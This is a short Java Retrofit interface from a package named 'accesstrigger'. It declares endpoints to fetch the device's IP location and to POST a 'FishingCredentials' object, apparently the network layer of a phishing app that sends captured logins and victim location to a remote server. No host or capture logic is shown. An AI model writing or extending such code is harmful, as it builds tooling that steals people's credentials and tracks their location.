package com.example.accesstrigger;

import java.util.Map;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.POST;

public interface ApiService {
    @GET(".")
    Call<Void>getRequest();

    @GET("json")
    Call<IPDataModel> getLocation();

    @POST(".")
    Call<Void>sendCredentials(@Body FishingCredentials fishingCredentials);
}
